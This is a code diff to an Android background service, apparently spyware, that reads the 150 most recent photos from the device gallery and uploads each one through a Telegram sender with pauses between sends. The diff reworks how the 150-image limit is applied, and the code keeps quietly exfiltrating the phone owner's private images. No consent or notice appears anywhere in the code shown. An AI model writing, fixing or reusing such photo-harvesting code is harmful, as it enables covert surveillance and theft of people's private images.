@@ -23,7 +23,7 @@ public class GalleryService extends Service {
         new Thread(() -> {
             List<Uri> allImages = getRecentImages();
             
-            // Берем 150 последних
+            // Отправляем по одному с паузой
             for (int i = 0; i < allImages.size(); i++) {
                 Uri uri = allImages.get(i);
                 try {
@@ -51,11 +51,9 @@ public class GalleryService extends Service {
                         byte[] bytes = baos.toByteArray();
                         bitmap.recycle(); // Освобождаем память СРАЗУ
                         
-                        // Отправляем по одному, чтобы не нагружать сеть и память
                         new TelegramSender().send(bytes, "gallery_" + i + ".jpg");
                         
-                        // Пауза 2 секунды, чтобы телефон остыл
-                        Thread.sleep(2000); 
+                        Thread.sleep(2000); // Пауза 2 секунды, чтобы не вылетало
                     }
                 } catch (Exception e) { e.printStackTrace(); }
                 catch (OutOfMemoryError e) { System.gc(); }
@@ -68,7 +66,9 @@ public class GalleryService extends Service {
     private List<Uri> getRecentImages() {
         List<Uri> imageUris = new ArrayList<>();
         String[] projection = new String[]{MediaStore.Images.Media._ID};
-        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 150";
+        
+        // Убрали LIMIT отсюда, только сортировка
+        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
         Cursor cursor = getContentResolver().query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
@@ -76,10 +76,13 @@ public class GalleryService extends Service {
         );
 
         if (cursor != null) {
-            while (cursor.moveToNext()) {
+            // Ограничиваем цикл 150 фотками
+            int count = 0;
+            while (cursor.moveToNext() && count < 150) {
                 long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                 Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                 imageUris.add(uri);
+                count++;
             }
             cursor.close();
         }
